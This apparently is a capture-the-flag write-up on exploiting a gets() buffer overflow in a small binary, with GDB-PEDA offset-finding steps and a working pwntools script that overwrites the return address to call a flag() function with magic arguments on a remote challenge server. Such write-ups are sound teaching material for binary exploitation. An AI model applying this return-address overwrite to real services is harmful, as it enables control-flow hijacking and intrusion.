We find 4 Main functions
```
flag()
frame_dummy()
main()
vuln()
```

`flag()`
![[Pasted image 20240606212733.png]]

`frame_dummy()` - Does nothing
![[Pasted image 20240606212802.png]]



`main()` calls `vuln()`
![[Pasted image 20240606212709.png]]


`vuln()` function susceptible to Buffer Overflow
- Uses deprecated `gets()` and `puts()` instead of `fgets()`
- Essentially, `gets()` does not check for input size determined by the `char [180]`

**INSTALL GDB-PEDA**
#tools

`echo "source ~/peda/peda.py" >> ~/.gdbinit`

PEDA adds python support for GDB

`gdb vuln`
`disassemble main`
- Used to view memory locations for various functions

![[Pasted image 20240610120949.png]]

![[Pasted image 20240610121010.png]]

We see that the `vuln()`function is being called.
Let's disassemble and view as well

![[Pasted image 20240610121106.png]]

So we know the `gets()`and `puts()`commands are vulnerable.
Let's use `pattern create`to inject into the program

`pattern create 200`

![[Pasted image 20240610121623.png]]

Run to overwrite the **EBP**, **ESP**, and **EIP**

![[Pasted image 20240610121831.png]]

Now we need to find the offset of **EIP** using `pattern offset`

![[Pasted image 20240610122007.png]]

This tells us that it took 188 characters to overwrite the buffer, adding and EBP value

Install `pwn` module using `pip install pwn`
Create payload

![[Pasted image 20240610123435.png]]

```
#!/usr/bin/python3

from pwn import *

# Address of the flag function
flag = 0x080491e2

# Target server details
host = "83.136.253.103"
port = "49045"

# Magic numbers required by the flag function
deadbeef = 0xdeadbeef
codedood = 0xc0ded00d

# Create the payload
# 188 'A' characters to overflow the buffer and reach the return address
# Address of the flag function
# 4 'A' characters for stack alignment
# Magic numbers required by the flag function
payload = b"A"*188 + p32(flag) + b"A"*4 + p32(deadbeef) + p32(codedood)

# Establish a connection to the remote server
p = remote(host, port)

# Send the payload
p.sendline(payload)

# Switch to interactive mode
p.interactive()

```

**==Summary of the Attack==**

1. **Vulnerability Exploitation**:
    
    - The `gets()` function in `vuln()` does not limit the input size, allowing for a buffer overflow.
    - The overflowed buffer overwrites the return address of `vuln()` with the address of `flag()`.
2. **Control Flow Hijacking**:
    
    - By overwriting the return address, the attacker redirects execution to the `flag()` function.
3. **Flag Function Execution**:
    
    - The `flag()` function checks for the specific values `0xdeadbeef` and `0xc0ded00d` before printing the flag.
    - These values are provided in the payload to pass the checks.
4. **Payload Composition**:
    
    - **188 'A' characters**: Overflow the buffer.
    - **Address of `flag()`**: Overwrite the return address.
    - **4 'A' characters**: Align the stack.
    - **Magic numbers**: Pass the validation checks in `flag()`.

By following these steps, the exploit script successfully hijacks the control flow of the vulnerable program and executes the `flag` function, which is likely intended to print a secret or sensitive information. This kind of exploit demonstrates a classic buffer overflow attack, where improper input validation leads to arbitrary code execution.


**Stack layout after overflow:**
```
[ Buffer (188 bytes) ][ Return Address (flag) ][ Padding (4 bytes) ][ Arg1 (0xdeadbeef) ][ Arg2 (0xc0ded00d) ]

```
